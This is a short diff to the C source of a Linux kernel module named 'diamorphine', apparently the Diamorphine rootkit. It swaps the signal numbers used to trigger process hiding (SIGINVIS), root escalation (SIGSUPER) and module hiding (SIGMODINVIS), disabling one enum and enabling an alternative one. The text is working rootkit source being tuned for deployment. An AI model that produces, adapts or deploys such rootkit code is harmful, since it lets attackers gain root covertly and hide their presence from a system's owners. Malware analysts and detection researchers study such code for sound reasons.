@@ -15,18 +15,18 @@ struct linux_dirent {
 
 #define MODULE_NAME "diamorphine"
 
-enum {
-  SIGINVIS = 31,
-  SIGSUPER = 64,
-  SIGMODINVIS = 63,
-};
+// enum {
+//   SIGINVIS = 31,
+//   SIGSUPER = 64,
+//   SIGMODINVIS = 63,
+// };
 
 // Test those signals if the other ones are not working.
-// enum {
-// 	SIGINVIS = 10,
-// 	SIGSUPER = 12,
-// 	SIGMODINVIS = 28,
-// };
+enum {
+	SIGINVIS = 10,
+	SIGSUPER = 12,
+	SIGMODINVIS = 28,
+};
 
 #ifndef IS_ENABLED
 #define IS_ENABLED(option)                                                     \
